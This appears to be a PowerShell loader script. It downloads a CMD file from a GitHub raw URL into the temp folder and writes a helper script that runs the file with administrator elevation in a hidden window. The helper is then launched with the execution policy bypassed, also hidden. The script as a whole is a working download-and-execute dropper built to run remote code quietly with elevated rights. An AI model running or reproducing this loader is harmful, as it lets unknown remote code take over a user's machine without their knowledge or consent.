# Enable TLSv1.2 for compatibility
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Set the URL for the CMD file
$cmdUrl = "https://github.com/nizhenets/test/raw/main/test.cmd"

# Define the temporary file path
$tempPath = "$env:TEMP\test.cmd"

# Download the CMD file
Invoke-WebRequest -Uri $cmdUrl -OutFile $tempPath

# Create a PowerShell script to run the CMD file as administrator in invisible mode
$scriptContent = @"
Start-Process -FilePath 'cmd.exe' -ArgumentList '/c `"start /min $tempPath`"' -Verb RunAs -WindowStyle Hidden
"@

# Define the path for the temporary PowerShell script
$psScriptPath = "$env:TEMP\RunAsAdmin.ps1"

# Write the script content to the temporary file
$scriptContent | Out-File -FilePath $psScriptPath -Encoding ASCII

# Execute the PowerShell script to run the CMD file as administrator in invisible mode
Start-Process -FilePath 'powershell.exe' -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$psScriptPath`"" -WindowStyle Hidden
